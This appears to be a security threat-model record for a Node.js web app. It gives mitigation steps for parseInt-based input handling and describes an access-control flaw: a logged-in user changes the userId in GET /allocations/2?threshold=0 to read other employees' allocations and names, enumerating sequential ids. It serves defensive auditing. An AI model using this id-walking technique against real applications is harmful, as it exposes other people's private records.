steps: In app/routes/contributions.js:32-34 use parseInt(req.body.preTax, 10) (the commented-out alternative) for all three fields.
Reject non-integer or out-of-range values with a 400 before invoking contributionsDAO.update.
Coerce userId with parseInt in app/data/contributions-dao.js so the update filter matches the stored numeric type.

threats.title: URL-supplied userId flows to AllocationsDAO, exposing other users' allocations
threats.asset: other users' allocation records and associated names
threats.attackScenario: A logged-in user requests GET /allocations/2?threshold=0; app/routes/allocations.js:16-23 takes userId from req.params rather than req.session and hands it to allocationsDAO.getByUserIdAndThreshold, so the DAO call returns another user's stocks/funds/bonds and name fields to the attacker.
assumptions: No ownership check exists between the route handler and the DAO for allocation lookups.
No ownership check is applied; any authenticated user can read another employee's allocations by changing the userId in the URL.
User ids are sequential integers, as the getNextSequence counter in app/data/user-dao.js implies.
threats.impactReason: Every user's allocation record plus first/last name can be enumerated one id at a time.
threats.likelihoodReason: Any self-registered account can walk numeric ids in the URL path; no special position needed. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Derive the allocations userId from the session instead of the URL.
